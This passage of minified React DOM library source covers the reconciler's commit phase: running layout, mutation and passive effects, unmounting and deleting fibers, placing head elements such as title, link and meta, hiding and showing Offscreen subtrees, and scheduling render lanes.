                  switch (l.nodeName) {
                    case "HEAD":
                    case "HTML":
                    case "BODY":
                      Jf(l);
                      break;
                    default:
                      l.textContent = "";
                  }
              }
              break;
            case 5:
            case 26:
            case 27:
            case 6:
            case 4:
            case 17:
              break;
            default:
              if ((l & 1024) !== 0) throw Error(v(163));
          }
          if (((l = t.sibling), l !== null)) {
            (l.return = t.return), (Ul = l);
            break;
          }
          Ul = t.return;
        }
  }
  function wo(l, t, e) {
    var a = e.flags;
    switch (e.tag) {
      case 0:
      case 11:
      case 15:
        Jt(l, e), a & 4 && eu(5, e);
        break;
      case 1:
        if ((Jt(l, e), a & 4))
          if (((l = e.stateNode), t === null))
            try {
              l.componentDidMount();
            } catch (i) {
              ul(e, e.return, i);
            }
          else {
            var u = Ge(e.type, t.memoizedProps);
            t = t.memoizedState;
            try {
              l.componentDidUpdate(u, t, l.__reactInternalSnapshotBeforeUpdate);
            } catch (i) {
              ul(e, e.return, i);
            }
          }
        a & 64 && Lo(e), a & 512 && au(e, e.return);
        break;
      case 3:
        if ((Jt(l, e), a & 64 && ((l = e.updateQueue), l !== null))) {
          if (((t = null), e.child !== null))
            switch (e.child.tag) {
              case 27:
              case 5:
                t = e.child.stateNode;
                break;
              case 1:
                t = e.child.stateNode;
            }
          try {
            Cs(l, t);
          } catch (i) {
            ul(e, e.return, i);
          }
        }
        break;
      case 27:
        t === null && a & 4 && Ko(e);
      case 26:
      case 5:
        Jt(l, e), t === null && a & 4 && Zo(e), a & 512 && au(e, e.return);
        break;
      case 12:
        Jt(l, e);
        break;
      case 31:
        Jt(l, e), a & 4 && $o(l, e);
        break;
      case 13:
        Jt(l, e),
          a & 4 && Fo(l, e),
          a & 64 &&
            ((l = e.memoizedState),
            l !== null &&
              ((l = l.dehydrated),
              l !== null && ((e = fr.bind(null, e)), Mr(l, e))));
        break;
      case 22:
        if (((a = e.memoizedState !== null || Vt), !a)) {
          (t = (t !== null && t.memoizedState !== null) || jl), (u = Vt);
          var n = jl;
          (Vt = a),
            (jl = t) && !n ? wt(l, e, (e.subtreeFlags & 8772) !== 0) : Jt(l, e),
            (Vt = u),
            (jl = n);
        }
        break;
      case 30:
        break;
      default:
        Jt(l, e);
    }
  }
  function Wo(l) {
    var t = l.alternate;
    t !== null && ((l.alternate = null), Wo(t)),
      (l.child = null),
      (l.deletions = null),
      (l.sibling = null),
      l.tag === 5 && ((t = l.stateNode), t !== null && $n(t)),
      (l.stateNode = null),
      (l.return = null),
      (l.dependencies = null),
      (l.memoizedProps = null),
      (l.memoizedState = null),
      (l.pendingProps = null),
      (l.stateNode = null),
      (l.updateQueue = null);
  }
  var vl = null,
    Il = !1;
  function Kt(l, t, e) {
    for (e = e.child; e !== null; ) ko(l, t, e), (e = e.sibling);
  }
  function ko(l, t, e) {
    if (ut && typeof ut.onCommitFiberUnmount == "function")
      try {
        ut.onCommitFiberUnmount(Ma, e);
      } catch {}
    switch (e.tag) {
      case 26:
        jl || Dt(e, t),
          Kt(l, t, e),
          e.memoizedState
            ? e.memoizedState.count--
            : e.stateNode && ((e = e.stateNode), e.parentNode.removeChild(e));
        break;
      case 27:
        jl || Dt(e, t);
        var a = vl,
          u = Il;
        ge(e.type) && ((vl = e.stateNode), (Il = !1)),
          Kt(l, t, e),
          ru(e.stateNode),
          (vl = a),
          (Il = u);
        break;
      case 5:
        jl || Dt(e, t);
      case 6:
        if (
          ((a = vl),
          (u = Il),
          (vl = null),
          Kt(l, t, e),
          (vl = a),
          (Il = u),
          vl !== null)
        )
          if (Il)
            try {
              (vl.nodeType === 9
                ? vl.body
                : vl.nodeName === "HTML"
                ? vl.ownerDocument.body
                : vl
              ).removeChild(e.stateNode);
            } catch (n) {
              ul(e, t, n);
            }
          else
            try {
              vl.removeChild(e.stateNode);
            } catch (n) {
              ul(e, t, n);
            }
        break;
      case 18:
        vl !== null &&
          (Il
            ? ((l = vl),
              Ld(
                l.nodeType === 9
                  ? l.body
                  : l.nodeName === "HTML"
                  ? l.ownerDocument.body
                  : l,
                e.stateNode
              ),
              Aa(l))
            : Ld(vl, e.stateNode));
        break;
      case 4:
        (a = vl),
          (u = Il),
          (vl = e.stateNode.containerInfo),
          (Il = !0),
          Kt(l, t, e),
          (vl = a),
          (Il = u);
        break;
      case 0:
      case 11:
      case 14:
      case 15:
        oe(2, e, t), jl || oe(4, e, t), Kt(l, t, e);
        break;
      case 1:
        jl ||
          (Dt(e, t),
          (a = e.stateNode),
          typeof a.componentWillUnmount == "function" && Qo(e, t, a)),
          Kt(l, t, e);
        break;
      case 21:
        Kt(l, t, e);
        break;
      case 22:
        (jl = (a = jl) || e.memoizedState !== null), Kt(l, t, e), (jl = a);
        break;
      default:
        Kt(l, t, e);
    }
  }
  function $o(l, t) {
    if (
      t.memoizedState === null &&
      ((l = t.alternate), l !== null && ((l = l.memoizedState), l !== null))
    ) {
      l = l.dehydrated;
      try {
        Aa(l);
      } catch (e) {
        ul(t, t.return, e);
      }
    }
  }
  function Fo(l, t) {
    if (
      t.memoizedState === null &&
      ((l = t.alternate),
      l !== null &&
        ((l = l.memoizedState), l !== null && ((l = l.dehydrated), l !== null)))
    )
      try {
        Aa(l);
      } catch (e) {
        ul(t, t.return, e);
      }
  }
  function P1(l) {
    switch (l.tag) {
      case 31:
      case 13:
      case 19:
        var t = l.stateNode;
        return t === null && (t = l.stateNode = new Jo()), t;
      case 22:
        return (
          (l = l.stateNode),
          (t = l._retryCache),
          t === null && (t = l._retryCache = new Jo()),
          t
        );
      default:
        throw Error(v(435, l.tag));
    }
  }
  function yn(l, t) {
    var e = P1(l);
    t.forEach(function (a) {
      if (!e.has(a)) {
        e.add(a);
        var u = cr.bind(null, l, a);
        a.then(u, u);
      }
    });
  }
  function Pl(l, t) {
    var e = t.deletions;
    if (e !== null)
      for (var a = 0; a < e.length; a++) {
        var u = e[a],
          n = l,
          i = t,
          f = i;
        l: for (; f !== null; ) {
          switch (f.tag) {
            case 27:
              if (ge(f.type)) {
                (vl = f.stateNode), (Il = !1);
                break l;
              }
              break;
            case 5:
              (vl = f.stateNode), (Il = !1);
              break l;
            case 3:
            case 4:
              (vl = f.stateNode.containerInfo), (Il = !0);
              break l;
          }
          f = f.return;
        }
        if (vl === null) throw Error(v(160));
        ko(n, i, u),
          (vl = null),
          (Il = !1),
          (n = u.alternate),
          n !== null && (n.return = null),
          (u.return = null);
      }
    if (t.subtreeFlags & 13886)
      for (t = t.child; t !== null; ) Io(t, l), (t = t.sibling);
  }
  var jt = null;
  function Io(l, t) {
    var e = l.alternate,
      a = l.flags;
    switch (l.tag) {
      case 0:
      case 11:
      case 14:
      case 15:
        Pl(t, l),
          lt(l),
          a & 4 && (oe(3, l, l.return), eu(3, l), oe(5, l, l.return));
        break;
      case 1:
        Pl(t, l),
          lt(l),
          a & 512 && (jl || e === null || Dt(e, e.return)),
          a & 64 &&
            Vt &&
            ((l = l.updateQueue),
            l !== null &&
              ((a = l.callbacks),
              a !== null &&
                ((e = l.shared.hiddenCallbacks),
                (l.shared.hiddenCallbacks = e === null ? a : e.concat(a)))));
        break;
      case 26:
        var u = jt;
        if (
          (Pl(t, l),
          lt(l),
          a & 512 && (jl || e === null || Dt(e, e.return)),
          a & 4)
        ) {
          var n = e !== null ? e.memoizedState : null;
          if (((a = l.memoizedState), e === null))
            if (a === null)
              if (l.stateNode === null) {
                l: {
                  (a = l.type),
                    (e = l.memoizedProps),
                    (u = u.ownerDocument || u);
                  t: switch (a) {
                    case "title":
                      (n = u.getElementsByTagName("title")[0]),
                        (!n ||
                          n[Ca] ||
                          n[ql] ||
                          n.namespaceURI === "http://www.w3.org/2000/svg" ||
                          n.hasAttribute("itemprop")) &&
                          ((n = u.createElement(a)),
                          u.head.insertBefore(
                            n,
                            u.querySelector("head > title")
                          )),
                        Ll(n, a, e),
                        (n[ql] = l),
                        Dl(n),
                        (a = n);
                      break l;
                    case "link":
                      var i = Id("link", "href", u).get(a + (e.href || ""));
                      if (i) {
                        for (var f = 0; f < i.length; f++)
                          if (
                            ((n = i[f]),
                            n.getAttribute("href") ===
                              (e.href == null || e.href === ""
                                ? null
                                : e.href) &&
                              n.getAttribute("rel") ===
                                (e.rel == null ? null : e.rel) &&
                              n.getAttribute("title") ===
                                (e.title == null ? null : e.title) &&
                              n.getAttribute("crossorigin") ===
                                (e.crossOrigin == null ? null : e.crossOrigin))
                          ) {
                            i.splice(f, 1);
                            break t;
                          }
                      }
                      (n = u.createElement(a)),
                        Ll(n, a, e),
                        u.head.appendChild(n);
                      break;
                    case "meta":
                      if (
                        (i = Id("meta", "content", u).get(
                          a + (e.content || "")
                        ))
                      ) {
                        for (f = 0; f < i.length; f++)
                          if (
                            ((n = i[f]),
                            n.getAttribute("content") ===
                              (e.content == null ? null : "" + e.content) &&
                              n.getAttribute("name") ===
                                (e.name == null ? null : e.name) &&
                              n.getAttribute("property") ===
                                (e.property == null ? null : e.property) &&
                              n.getAttribute("http-equiv") ===
                                (e.httpEquiv == null ? null : e.httpEquiv) &&
                              n.getAttribute("charset") ===
                                (e.charSet == null ? null : e.charSet))
                          ) {
                            i.splice(f, 1);
                            break t;
                          }
                      }
                      (n = u.createElement(a)),
                        Ll(n, a, e),
                        u.head.appendChild(n);
                      break;
                    default:
                      throw Error(v(468, a));
                  }
                  (n[ql] = l), Dl(n), (a = n);
                }
                l.stateNode = a;
              } else Pd(u, l.type, l.stateNode);
            else l.stateNode = Fd(u, a, l.memoizedProps);
          else
            n !== a
              ? (n === null
                  ? e.stateNode !== null &&
                    ((e = e.stateNode), e.parentNode.removeChild(e))
                  : n.count--,
                a === null
                  ? Pd(u, l.type, l.stateNode)
                  : Fd(u, a, l.memoizedProps))
              : a === null &&
                l.stateNode !== null &&
                Sf(l, l.memoizedProps, e.memoizedProps);
        }
        break;
      case 27:
        Pl(t, l),
          lt(l),
          a & 512 && (jl || e === null || Dt(e, e.return)),
          e !== null && a & 4 && Sf(l, l.memoizedProps, e.memoizedProps);
        break;
      case 5:
        if (
          (Pl(t, l),
          lt(l),
          a & 512 && (jl || e === null || Dt(e, e.return)),
          l.flags & 32)
        ) {
          u = l.stateNode;
          try {
            We(u, "");
          } catch (M) {
            ul(l, l.return, M);
          }
        }
        a & 4 &&
          l.stateNode != null &&
          ((u = l.memoizedProps), Sf(l, u, e !== null ? e.memoizedProps : u)),
          a & 1024 && (xf = !0);
        break;
      case 6:
        if ((Pl(t, l), lt(l), a & 4)) {
          if (l.stateNode === null) throw Error(v(162));
          (a = l.memoizedProps), (e = l.stateNode);
          try {
            e.nodeValue = a;
          } catch (M) {
            ul(l, l.return, M);
          }
        }
        break;
      case 3:
        if (
          ((On = null),
          (u = jt),
          (jt = Mn(t.containerInfo)),
          Pl(t, l),
          (jt = u),
          lt(l),
          a & 4 && e !== null && e.memoizedState.isDehydrated)
        )
          try {
            Aa(t.containerInfo);
          } catch (M) {
            ul(l, l.return, M);
          }
        xf && ((xf = !1), Po(l));
        break;
      case 4:
        (a = jt),
          (jt = Mn(l.stateNode.containerInfo)),
          Pl(t, l),
          lt(l),
          (jt = a);
        break;
      case 12:
        Pl(t, l), lt(l);
        break;
      case 31:
        Pl(t, l),
          lt(l),
          a & 4 &&
            ((a = l.updateQueue),
            a !== null && ((l.updateQueue = null), yn(l, a)));
        break;
      case 13:
        Pl(t, l),
          lt(l),
          l.child.flags & 8192 &&
            (l.memoizedState !== null) !=
              (e !== null && e.memoizedState !== null) &&
            (vn = at()),
          a & 4 &&
            ((a = l.updateQueue),
            a !== null && ((l.updateQueue = null), yn(l, a)));
        break;
      case 22:
        u = l.memoizedState !== null;
        var c = e !== null && e.memoizedState !== null,
          h = Vt,
          b = jl;
        if (
          ((Vt = h || u),
          (jl = b || c),
          Pl(t, l),
          (jl = b),
          (Vt = h),
          lt(l),
          a & 8192)
        )
          l: for (
            t = l.stateNode,
              t._visibility = u ? t._visibility & -2 : t._visibility | 1,
              u && (e === null || c || Vt || jl || Xe(l)),
              e = null,
              t = l;
            ;

          ) {
            if (t.tag === 5 || t.tag === 26) {
              if (e === null) {
                c = e = t;
                try {
                  if (((n = c.stateNode), u))
                    (i = n.style),
                      typeof i.setProperty == "function"
                        ? i.setProperty("display", "none", "important")
                        : (i.display = "none");
                  else {
                    f = c.stateNode;
                    var x = c.memoizedProps.style,
                      m =
                        x != null && x.hasOwnProperty("display")
                          ? x.display
                          : null;
                    f.style.display =
                      m == null || typeof m == "boolean" ? "" : ("" + m).trim();
                  }
                } catch (M) {
                  ul(c, c.return, M);
                }
              }
            } else if (t.tag === 6) {
              if (e === null) {
                c = t;
                try {
                  c.stateNode.nodeValue = u ? "" : c.memoizedProps;
                } catch (M) {
                  ul(c, c.return, M);
                }
              }
            } else if (t.tag === 18) {
              if (e === null) {
                c = t;
                try {
                  var g = c.stateNode;
                  u ? Qd(g, !0) : Qd(c.stateNode, !1);
                } catch (M) {
                  ul(c, c.return, M);
                }
              }
            } else if (
              ((t.tag !== 22 && t.tag !== 23) ||
                t.memoizedState === null ||
                t === l) &&
              t.child !== null
            ) {
              (t.child.return = t), (t = t.child);
              continue;
            }
            if (t === l) break l;
            for (; t.sibling === null; ) {
              if (t.return === null || t.return === l) break l;
              e === t && (e = null), (t = t.return);
            }
            e === t && (e = null),
              (t.sibling.return = t.return),
              (t = t.sibling);
          }
        a & 4 &&
          ((a = l.updateQueue),
          a !== null &&
            ((e = a.retryQueue),
            e !== null && ((a.retryQueue = null), yn(l, e))));
        break;
      case 19:
        Pl(t, l),
          lt(l),
          a & 4 &&
            ((a = l.updateQueue),
            a !== null && ((l.updateQueue = null), yn(l, a)));
        break;
      case 30:
        break;
      case 21:
        break;
      default:
        Pl(t, l), lt(l);
    }
  }
  function lt(l) {
    var t = l.flags;
    if (t & 2) {
      try {
        for (var e, a = l.return; a !== null; ) {
          if (Vo(a)) {
            e = a;
            break;
          }
          a = a.return;
        }
        if (e == null) throw Error(v(160));
        switch (e.tag) {
          case 27:
            var u = e.stateNode,
              n = bf(l);
            rn(l, n, u);
            break;
          case 5:
            var i = e.stateNode;
            e.flags & 32 && (We(i, ""), (e.flags &= -33));
            var f = bf(l);
            rn(l, f, i);
            break;
          case 3:
          case 4:
            var c = e.stateNode.containerInfo,
              h = bf(l);
            pf(l, h, c);
            break;
          default:
            throw Error(v(161));
        }
      } catch (b) {
        ul(l, l.return, b);
      }
      l.flags &= -3;
    }
    t & 4096 && (l.flags &= -4097);
  }
  function Po(l) {
    if (l.subtreeFlags & 1024)
      for (l = l.child; l !== null; ) {
        var t = l;
        Po(t),
          t.tag === 5 && t.flags & 1024 && t.stateNode.reset(),
          (l = l.sibling);
      }
  }
  function Jt(l, t) {
    if (t.subtreeFlags & 8772)
      for (t = t.child; t !== null; ) wo(l, t.alternate, t), (t = t.sibling);
  }
  function Xe(l) {
    for (l = l.child; l !== null; ) {
      var t = l;
      switch (t.tag) {
        case 0:
        case 11:
        case 14:
        case 15:
          oe(4, t, t.return), Xe(t);
          break;
        case 1:
          Dt(t, t.return);
          var e = t.stateNode;
          typeof e.componentWillUnmount == "function" && Qo(t, t.return, e),
            Xe(t);
          break;
        case 27:
          ru(t.stateNode);
        case 26:
        case 5:
          Dt(t, t.return), Xe(t);
          break;
        case 22:
          t.memoizedState === null && Xe(t);
          break;
        case 30:
          Xe(t);
          break;
        default:
          Xe(t);
      }
      l = l.sibling;
    }
  }
  function wt(l, t, e) {
    for (e = e && (t.subtreeFlags & 8772) !== 0, t = t.child; t !== null; ) {
      var a = t.alternate,
        u = l,
        n = t,
        i = n.flags;
      switch (n.tag) {
        case 0:
        case 11:
        case 15:
          wt(u, n, e), eu(4, n);
          break;
        case 1:
          if (
            (wt(u, n, e),
            (a = n),
            (u = a.stateNode),
            typeof u.componentDidMount == "function")
          )
            try {
              u.componentDidMount();
            } catch (h) {
              ul(a, a.return, h);
            }
          if (((a = n), (u = a.updateQueue), u !== null)) {
            var f = a.stateNode;
            try {
              var c = u.shared.hiddenCallbacks;
              if (c !== null)
                for (u.shared.hiddenCallbacks = null, u = 0; u < c.length; u++)
                  Os(c[u], f);
            } catch (h) {
              ul(a, a.return, h);
            }
          }
          e && i & 64 && Lo(n), au(n, n.return);
          break;
        case 27:
          Ko(n);
        case 26:
        case 5:
          wt(u, n, e), e && a === null && i & 4 && Zo(n), au(n, n.return);
          break;
        case 12:
          wt(u, n, e);
          break;
        case 31:
          wt(u, n, e), e && i & 4 && $o(u, n);
          break;
        case 13:
          wt(u, n, e), e && i & 4 && Fo(u, n);
          break;
        case 22:
          n.memoizedState === null && wt(u, n, e), au(n, n.return);
          break;
        case 30:
          break;
        default:
          wt(u, n, e);
      }
      t = t.sibling;
    }
  }
  function zf(l, t) {
    var e = null;
    l !== null &&
      l.memoizedState !== null &&
      l.memoizedState.cachePool !== null &&
      (e = l.memoizedState.cachePool.pool),
      (l = null),
      t.memoizedState !== null &&
        t.memoizedState.cachePool !== null &&
        (l = t.memoizedState.cachePool.pool),
      l !== e && (l != null && l.refCount++, e != null && Za(e));
  }
  function Tf(l, t) {
    (l = null),
      t.alternate !== null && (l = t.alternate.memoizedState.cache),
      (t = t.memoizedState.cache),
      t !== l && (t.refCount++, l != null && Za(l));
  }
  function Mt(l, t, e, a) {
    if (t.subtreeFlags & 10256)
      for (t = t.child; t !== null; ) ld(l, t, e, a), (t = t.sibling);
  }
  function ld(l, t, e, a) {
    var u = t.flags;
    switch (t.tag) {
      case 0:
      case 11:
      case 15:
        Mt(l, t, e, a), u & 2048 && eu(9, t);
        break;
      case 1:
        Mt(l, t, e, a);
        break;
      case 3:
        Mt(l, t, e, a),
          u & 2048 &&
            ((l = null),
            t.alternate !== null && (l = t.alternate.memoizedState.cache),
            (t = t.memoizedState.cache),
            t !== l && (t.refCount++, l != null && Za(l)));
        break;
      case 12:
        if (u & 2048) {
          Mt(l, t, e, a), (l = t.stateNode);
          try {
            var n = t.memoizedProps,
              i = n.id,
              f = n.onPostCommit;
            typeof f == "function" &&
              f(
                i,
                t.alternate === null ? "mount" : "update",
                l.passiveEffectDuration,
                -0
              );
          } catch (c) {
            ul(t, t.return, c);
          }
        } else Mt(l, t, e, a);
        break;
      case 31:
        Mt(l, t, e, a);
        break;
      case 13:
        Mt(l, t, e, a);
        break;
      case 23:
        break;
      case 22:
        (n = t.stateNode),
          (i = t.alternate),
          t.memoizedState !== null
            ? n._visibility & 2
              ? Mt(l, t, e, a)
              : uu(l, t)
            : n._visibility & 2
            ? Mt(l, t, e, a)
            : ((n._visibility |= 2),
              ha(l, t, e, a, (t.subtreeFlags & 10256) !== 0 || !1)),
          u & 2048 && zf(i, t);
        break;
      case 24:
        Mt(l, t, e, a), u & 2048 && Tf(t.alternate, t);
        break;
      default:
        Mt(l, t, e, a);
    }
  }
  function ha(l, t, e, a, u) {
    for (
      u = u && ((t.subtreeFlags & 10256) !== 0 || !1), t = t.child;
      t !== null;

    ) {
      var n = l,
        i = t,
        f = e,
        c = a,
        h = i.flags;
      switch (i.tag) {
        case 0:
        case 11:
        case 15:
          ha(n, i, f, c, u), eu(8, i);
          break;
        case 23:
          break;
        case 22:
          var b = i.stateNode;
          i.memoizedState !== null
            ? b._visibility & 2
              ? ha(n, i, f, c, u)
              : uu(n, i)
            : ((b._visibility |= 2), ha(n, i, f, c, u)),
            u && h & 2048 && zf(i.alternate, i);
          break;
        case 24:
          ha(n, i, f, c, u), u && h & 2048 && Tf(i.alternate, i);
          break;
        default:
          ha(n, i, f, c, u);
      }
      t = t.sibling;
    }
  }
  function uu(l, t) {
    if (t.subtreeFlags & 10256)
      for (t = t.child; t !== null; ) {
        var e = l,
          a = t,
          u = a.flags;
        switch (a.tag) {
          case 22:
            uu(e, a), u & 2048 && zf(a.alternate, a);
            break;
          case 24:
            uu(e, a), u & 2048 && Tf(a.alternate, a);
            break;
          default:
            uu(e, a);
        }
        t = t.sibling;
      }
  }
  var nu = 8192;
  function va(l, t, e) {
    if (l.subtreeFlags & nu)
      for (l = l.child; l !== null; ) td(l, t, e), (l = l.sibling);
  }
  function td(l, t, e) {
    switch (l.tag) {
      case 26:
        va(l, t, e),
          l.flags & nu &&
            l.memoizedState !== null &&
            Gr(e, jt, l.memoizedState, l.memoizedProps);
        break;
      case 5:
        va(l, t, e);
        break;
      case 3:
      case 4:
        var a = jt;
        (jt = Mn(l.stateNode.containerInfo)), va(l, t, e), (jt = a);
        break;
      case 22:
        l.memoizedState === null &&
          ((a = l.alternate),
          a !== null && a.memoizedState !== null
            ? ((a = nu), (nu = 16777216), va(l, t, e), (nu = a))
            : va(l, t, e));
        break;
      default:
        va(l, t, e);
    }
  }
  function ed(l) {
    var t = l.alternate;
    if (t !== null && ((l = t.child), l !== null)) {
      t.child = null;
      do (t = l.sibling), (l.sibling = null), (l = t);
      while (l !== null);
    }
  }
  function iu(l) {
    var t = l.deletions;
    if ((l.flags & 16) !== 0) {
      if (t !== null)
        for (var e = 0; e < t.length; e++) {
          var a = t[e];
          (Ul = a), ud(a, l);
        }
      ed(l);
    }
    if (l.subtreeFlags & 10256)
      for (l = l.child; l !== null; ) ad(l), (l = l.sibling);
  }
  function ad(l) {
    switch (l.tag) {
      case 0:
      case 11:
      case 15:
        iu(l), l.flags & 2048 && oe(9, l, l.return);
        break;
      case 3:
        iu(l);
        break;
      case 12:
        iu(l);
        break;
      case 22:
        var t = l.stateNode;
        l.memoizedState !== null &&
        t._visibility & 2 &&
        (l.return === null || l.return.tag !== 13)
          ? ((t._visibility &= -3), hn(l))
          : iu(l);
        break;
      default:
        iu(l);
    }
  }
  function hn(l) {
    var t = l.deletions;
    if ((l.flags & 16) !== 0) {
      if (t !== null)
        for (var e = 0; e < t.length; e++) {
          var a = t[e];
          (Ul = a), ud(a, l);
        }
      ed(l);
    }
    for (l = l.child; l !== null; ) {
      switch (((t = l), t.tag)) {
        case 0:
        case 11:
        case 15:
          oe(8, t, t.return), hn(t);
          break;
        case 22:
          (e = t.stateNode),
            e._visibility & 2 && ((e._visibility &= -3), hn(t));
          break;
        default:
          hn(t);
      }
      l = l.sibling;
    }
  }
  function ud(l, t) {
    for (; Ul !== null; ) {
      var e = Ul;
      switch (e.tag) {
        case 0:
        case 11:
        case 15:
          oe(8, e, t);
          break;
        case 23:
        case 22:
          if (e.memoizedState !== null && e.memoizedState.cachePool !== null) {
            var a = e.memoizedState.cachePool.pool;
            a != null && a.refCount++;
          }
          break;
        case 24:
          Za(e.memoizedState.cache);
      }
      if (((a = e.child), a !== null)) (a.return = e), (Ul = a);
      else
        l: for (e = l; Ul !== null; ) {
          a = Ul;
          var u = a.sibling,
            n = a.return;
          if ((Wo(a), a === e)) {
            Ul = null;
            break l;
          }
          if (u !== null) {
            (u.return = n), (Ul = u);
            break l;
          }
          Ul = n;
        }
    }
  }
  var lr = {
      getCacheForType: function (l) {
        var t = Gl(Tl),
          e = t.data.get(l);
        return e === void 0 && ((e = l()), t.data.set(l, e)), e;
      },
      cacheSignal: function () {
        return Gl(Tl).controller.signal;
      },
    },
    tr = typeof WeakMap == "function" ? WeakMap : Map,
    tl = 0,
    dl = null,
    w = null,
    k = 0,
    al = 0,
    ot = null,
    de = !1,
    ma = !1,
    Ef = !1,
    Wt = 0,
    Sl = 0,
    re = 0,
    Le = 0,
    Af = 0,
    dt = 0,
    ga = 0,
    fu = null,
    tt = null,
    jf = !1,
    vn = 0,
    nd = 0,
    mn = 1 / 0,
    gn = null,
    ye = null,
    _l = 0,
    he = null,
    Sa = null,
    kt = 0,
    Mf = 0,
    _f = null,
    id = null,
    cu = 0,
    Of = null;
  function rt() {
    return (tl & 2) !== 0 && k !== 0 ? k & -k : S.T !== null ? Bf() : xc();
  }
  function fd() {
    if (dt === 0)
      if ((k & 536870912) === 0 || F) {
        var l = Eu;
        (Eu <<= 1), (Eu & 3932160) === 0 && (Eu = 262144), (dt = l);
      } else dt = 536870912;
    return (l = ct.current), l !== null && (l.flags |= 32), dt;
  }
  function et(l, t, e) {
    ((l === dl && (al === 2 || al === 9)) || l.cancelPendingCommit !== null) &&
      (ba(l, 0), ve(l, k, dt, !1)),
      Oa(l, e),
      ((tl & 2) === 0 || l !== dl) &&
        (l === dl &&
          ((tl & 2) === 0 && (Le |= e), Sl === 4 && ve(l, k, dt, !1)),
        Ut(l));
  }
  function cd(l, t, e) {
    if ((tl & 6) !== 0) throw Error(v(327));
    var a = (!e && (t & 127) === 0 && (t & l.expiredLanes) === 0) || _a(l, t),
      u = a ? ur(l, t) : Df(l, t, !0),
      n = a;
    do {
      if (u === 0) {
        ma && !a && ve(l, t, 0, !1);
        break;
      } else {
        if (((e = l.current.alternate), n && !er(e))) {
          (u = Df(l, t, !1)), (n = !1);
          continue;
        }
        if (u === 2) {
          if (((n = t), l.errorRecoveryDisabledLanes & n)) var i = 0;
          else
            (i = l.pendingLanes & -536870913),
              (i = i !== 0 ? i : i & 536870912 ? 536870912 : 0);
          if (i !== 0) {
            t = i;
            l: {
              var f = l;
              u = fu;
              var c = f.current.memoizedState.isDehydrated;
              if ((c && (ba(f, i).flags |= 256), (i = Df(f, i, !1)), i !== 2)) {
                if (Ef && !c) {
                  (f.errorRecoveryDisabledLanes |= n), (Le |= n), (u = 4);
                  break l;
                }
                (n = tt),
                  (tt = u),
                  n !== null && (tt === null ? (tt = n) : tt.push.apply(tt, n));
              }
              u = i;
            }
            if (((n = !1), u !== 2)) continue;
          }
        }
        if (u === 1) {
          ba(l, 0), ve(l, t, 0, !0);
          break;
        }
        l: {
          switch (((a = l), (n = u), n)) {
            case 0:
            case 1:
              throw Error(v(345));
            case 4:
              if ((t & 4194048) !== t) break;
            case 6:
              ve(a, t, dt, !de);
              break l;
            case 2:
              tt = null;
              break;
            case 3:
            case 5:
              break;
            default:
              throw Error(v(329));
          }
          if ((t & 62914560) === t && ((u = vn + 300 - at()), 10 < u)) {
            if ((ve(a, t, dt, !de), ju(a, 0, !0) !== 0)) break l;
            (kt = t),
              (a.timeoutHandle = Gd(
                sd.bind(
                  null,
                  a,
                  e,
                  tt,
                  gn,
                  jf,
                  t,
                  dt,
                  Le,
                  ga,
                  de,
                  n,
                  "Throttled",
                  -0,
                  0
                ),
                u
              ));
            break l;
          }
          sd(a, e, tt, gn, jf, t, dt, Le, ga, de, n, null, -0, 0);
        }
      }
      break;
    } while (!0);
    Ut(l);
  }
  function sd(l, t, e, a, u, n, i, f, c, h, b, x, m, g) {
    if (
      ((l.timeoutHandle = -1),
      (x = t.subtreeFlags),
      x & 8192 || (x & 16785408) === 16785408)
    ) {
      (x = {
        stylesheets: null,
        count: 0,
        imgCount: 0,
        imgBytes: 0,
        suspenseyImages: [],
        waitingForImages: !0,
        waitingForViewTransition: !1,
        unsuspend: Rt,
      }),
        td(t, n, x);
      var M =
        (n & 62914560) === n ? vn - at() : (n & 4194048) === n ? nd - at() : 0;
      if (((M = Xr(x, M)), M !== null)) {
        (kt = n),
          (l.cancelPendingCommit = M(
            gd.bind(null, l, t, n, e, a, u, i, f, c, b, x, null, m, g)
          )),
          ve(l, n, i, !h);
        return;
      }
    }
    gd(l, t, n, e, a, u, i, f, c);
  }
  function er(l) {
    for (var t = l; ; ) {
      var e = t.tag;
      if (
        (e === 0 || e === 11 || e === 15) &&
        t.flags & 16384 &&
        ((e = t.updateQueue), e !== null && ((e = e.stores), e !== null))
      )
        for (var a = 0; a < e.length; a++) {
          var u = e[a],
            n = u.getSnapshot;
          u = u.value;
          try {
            if (!it(n(), u)) return !1;
          } catch {
            return !1;
          }
        }
      if (((e = t.child), t.subtreeFlags & 16384 && e !== null))
        (e.return = t), (t = e);
      else {
        if (t === l) break;
        for (; t.sibling === null; ) {
          if (t.return === null || t.return === l) return !0;
          t = t.return;
        }
        (t.sibling.return = t.return), (t = t.sibling);
      }
    }
    return !0;
  }
  function ve(l, t, e, a) {
    (t &= ~Af),
      (t &= ~Le),
      (l.suspendedLanes |= t),
      (l.pingedLanes &= ~t),
      a && (l.warmLanes |= t),
      (a = l.expirationTimes);
    for (var u = t; 0 < u; ) {
      var n = 31 - nt(u),
        i = 1 << n;
      (a[n] = -1), (u &= ~i);
    }
    e !== 0 && Sc(l, e, t);
  }
  function Sn() {
    return (tl & 6) === 0 ? (su(0), !1) : !0;
  }
  function Cf() {
    if (w !== null) {
      if (al === 0) var l = w.return;
      else (l = w), (Yt = Ue = null), Ki(l), (sa = null), (Ka = 0), (l = w);
      for (; l !== null; ) Xo(l.alternate, l), (l = l.return);
      w = null;
    }
  }
  function ba(l, t) {
    var e = l.timeoutHandle;
    e !== -1 && ((l.timeoutHandle = -1), zr(e)),
      (e = l.cancelPendingCommit),
      e !== null && ((l.cancelPendingCommit = null), e()),
      (kt = 0),
      Cf(),
      (dl = l),
      (w = e = Nt(l.current, null)),
      (k = t),
      (al = 0),
      (ot = null),
      (de = !1),
      (ma = _a(l, t)),
      (Ef = !1),
      (ga = dt = Af = Le = re = Sl = 0),
      (tt = fu = null),
      (jf = !1),
      (t & 8) !== 0 && (t |= t & 32);
    var a = l.entangledLanes;
    if (a !== 0)
      for (l = l.entanglements, a &= t; 0 < a; ) {
        var u = 31 - nt(a),
          n = 1 << u;
        (t |= l[u]), (a &= ~n);
      }
    return (Wt = t), Yu(), e;
  }
  function od(l, t) {
    (L = null),
      (S.H = Pa),
      t === ca || t === Ju
        ? ((t = As()), (al = 3))
        : t === Hi
        ? ((t = As()), (al = 4))
        : (al =
            t === cf
              ? 8
              : t !== null &&
                typeof t == "object" &&
                typeof t.then == "function"
              ? 6
              : 1),
      (ot = t),
      w === null && ((Sl = 1), fn(l, St(t, l.current)));
  }
  function dd() {
    var l = ct.current;
    return l === null
      ? !0
      : (k & 4194048) === k
      ? zt === null
      : (k & 62914560) === k || (k & 536870912) !== 0
